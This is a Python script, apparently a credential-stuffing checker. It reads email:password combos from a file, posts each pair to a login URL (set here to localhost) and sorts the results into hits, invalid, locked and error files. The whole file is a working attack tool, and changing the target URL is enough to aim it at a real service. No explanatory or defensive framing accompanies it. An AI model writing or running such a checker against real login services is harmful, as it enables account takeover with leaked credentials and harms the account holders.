import requests
from pathlib import Path

LOGIN_URL = "http://127.0.0.1:5000/login"
INPUT_FILE = "users.txt"

def check_combo(combo: str) -> tuple[str, str]:
    combo = combo.strip()

    if not combo:
        return combo, "VACIO"

    if ":" not in combo:
        return combo, "FORMATO_INVALIDO"

    email, password = combo.split(":", 1)
    email = email.strip().lower()
    password = password.strip()

    if not email or not password:
        return combo, "FORMATO_INVALIDO"

    try:
        response = requests.post(
            LOGIN_URL,
            json={"email": email, "password": password},
            timeout=5
        )

        try:
            data = response.json()
            status = data.get("status", "UNKNOWN")
        except ValueError:
            return combo, "RESPUESTA_INVALIDA"

        return f"{email}:{password}", status

    except requests.RequestException:
        return f"{email}:{password}", "ERROR_RED"


def main():
    path = Path(INPUT_FILE)

    if not path.exists():
        print(f"No existe el archivo: {INPUT_FILE}")
        return

    combos = [
        line.strip()
        for line in path.read_text(encoding="utf-8").splitlines()
        if line.strip()
    ]

    if not combos:
        print("El archivo está vacío.")
        return

    hits = []
    invalids = []
    locked = []
    errors = []

    for combo in combos:
        tested, result = check_combo(combo)
        print(f"{tested} -> {result}")

        if result == "VALID":
            hits.append(tested)
        elif result == "INVALID":
            invalids.append(tested)
        elif result == "LOCKED":
            locked.append(tested)
        else:
            errors.append(f"{tested} -> {result}")

    Path("hits.txt").write_text("\n".join(hits), encoding="utf-8")
    Path("invalids.txt").write_text("\n".join(invalids), encoding="utf-8")
    Path("locked.txt").write_text("\n".join(locked), encoding="utf-8")
    Path("errors.txt").write_text("\n".join(errors), encoding="utf-8")

    print("\nResumen:")
    print(f"VALID: {len(hits)}")
    print(f"INVALID: {len(invalids)}")
    print(f"LOCKED: {len(locked)}")
    print(f"OTROS: {len(errors)}")


if __name__ == "__main__":
    main()
